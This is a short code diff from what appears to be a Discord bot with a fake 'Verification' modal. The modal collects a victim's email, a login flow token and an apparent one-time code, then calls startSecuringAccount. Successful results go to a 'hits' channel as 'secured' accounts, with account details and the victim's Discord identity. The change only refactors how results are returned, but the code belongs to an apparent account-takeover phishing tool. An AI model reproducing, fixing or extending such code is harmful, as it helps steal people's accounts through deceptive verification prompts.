@@ -53,9 +53,9 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         self.session = getSession()
 
-        finalEmbeds = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
+        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
         
-        if not finalEmbeds:
+        if not securedAccount:
 
             await logs_channel.send(
                 embed = discord.Embed(
@@ -71,6 +71,9 @@ class MyModalTwo(ui.Modal, title="Verification"):
             
         await hits_channel.send("**Successfully secured an account**")
         await hits_channel.send(
-            embed = finalEmbeds[0],
-            view = accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
+            embed = securedAccount["hit_embed"],
+            view = accountInfo(
+                securedAccount["details"], 
+                interaction.user
+                )
         )
